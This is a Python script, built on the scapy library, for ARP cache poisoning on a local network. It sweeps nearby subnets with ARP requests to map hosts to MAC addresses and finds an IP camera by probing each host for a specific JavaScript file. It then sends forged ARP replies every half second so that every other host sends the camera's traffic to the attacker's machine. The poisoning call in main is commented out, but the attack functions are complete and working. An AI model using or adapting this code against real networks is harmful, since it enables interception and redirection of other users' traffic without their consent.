from scapy.all import *
from time import sleep

import requests
import threading


def create_arp_poison_packet(victim_mac, victim_ip, real_server_ip, own_mac):
    spoof_packet = Ether() / ARP()
    spoof_packet[Ether].src = own_mac
    spoof_packet[ARP].op = 2
    spoof_packet[ARP].hwsrc = own_mac
    spoof_packet[ARP].psrc = real_server_ip
    spoof_packet[ARP].hwdst = victim_mac
    spoof_packet[ARP].pdst = victim_ip
    return spoof_packet


def poison_all_repeatedly(victims, real_server_ip, own_mac):

    # For performance, we construct all packets in advance
    poison_packets = []
    for (victim_ip, victim_mac) in victims.items():
        poison_packets.append(create_arp_poison_packet(victim_mac, victim_ip, real_server_ip, own_mac))
    while True:
        sendp(poison_packets, verbose = False)
        sleep(0.5)


def find_targets(own_ip, own_mac, blacklist_ips):

    # We don't want to poison ourself
    blacklist_ips.append(own_ip)

    # Split own ip address into parts. This is useful for deciding which IP's to target
    index_first_dot = own_ip.index('.')
    index_second_dot = own_ip.index('.', index_first_dot + 1)
    base_ip = own_ip[0:index_second_dot + 1]

    print('Start crafting exploration packets. This can take a while...')
    exploration_packets = []
    # TODO Increase search space after testing
    for third_ip_part in range(3):
        if third_ip_part % 25 == 0:
            print('Crafting at ~' + str(10 * third_ip_part // 25) + '%')
        for fourth_ip_part in range(256):
            target_ip = base_ip + str(third_ip_part) + '.' + str(fourth_ip_part)
            if target_ip not in blacklist_ips:
                explore_packet = Ether() / ARP()
                explore_packet[Ether].src = own_mac
                explore_packet[Ether].dst = "ff:ff:ff:ff:ff:ff"
                explore_packet[ARP].op = "who-has"
                explore_packet[ARP].hwsrc = own_mac
                explore_packet[ARP].psrc = own_ip
                explore_packet[ARP].hwdst = "00:00:00:00:00:00"
                explore_packet[ARP].pdst = target_ip

                exploration_packets.append(explore_packet)

    print('Crafted the exploration packets')

    p_arp_responses = []
    p_can_stop_sniffing = [False]
    def sniff_function():
        print('Start sniffing for exploration responses')
        combined_arp_responses = []
        while not p_can_stop_sniffing[0]:
            combined_arp_responses.append(sniff(filter = 'arp and dst host ' + own_ip, timeout = 2))

        arp_responses = []
        for response_list in combined_arp_responses:
            for arp_response in response_list:
                arp_responses.append(arp_response)
        p_arp_responses.append(arp_responses)
        print('Finished sniffing for exploration responses')

    sniff_thread = threading.Thread(target = sniff_function)
    sniff_thread.start()

    # Wait 1 second to ensure that the sniffing thread started sniffing
    sleep(1)

    print('Send exploration packets...')
    sendp(exploration_packets, verbose = False)
    sleep(1)
    p_can_stop_sniffing[0] = True
    print('Sent all exploration packets')

    sniff_thread.join()

    mac_table = {}
    for arp_response in p_arp_responses[0]:
        if arp_response.op == 2:
            mac_table[arp_response.psrc] = arp_response.hwsrc

    return mac_table

def find_camera_ip(targets):
    p_camera_ip = [None]
    def try_ip(test_ip):
        try:
            test_response = requests.get('http://' + test_ip + '/module/WebGLCanvas.js', timeout = 10)
            if test_response:
                print('Found the camera at ip ' + test_ip)
                p_camera_ip[0] = test_ip
            else:
                print('Found some other HTTP server at ip ' + test_ip)
        except requests.exceptions.ConnectionError:
            print('Didnt get a response for ip ' + test_ip)

    test_threads = []
    for target_ip in targets:
        test_thread = threading.Thread(target = lambda: try_ip(target_ip))
        test_thread.start()
        test_threads.append(test_thread)

    for test_thread in test_threads:
        test_thread.join()

    return p_camera_ip[0]

def main():
    own_ip = ARP().psrc
    own_mac = Ether().src
    relay_ip = "insert..."

    targets = find_targets(own_ip, own_mac, [relay_ip])

    camera_ip = find_camera_ip(targets)
    print('Camera IP is ' + str(camera_ip))

    if camera_ip is None:
        return

    # Let's not poison the camera IP
    del targets[camera_ip]

    print('Targets are:')
    for (target_ip, target_mac) in targets.items():
        print(target_ip, '(', target_mac, ')')

    #print('Start poisoning...')
    #poison_all_repeatedly(targets, camera_ip, own_mac)


if __name__ == '__main__':
    main()
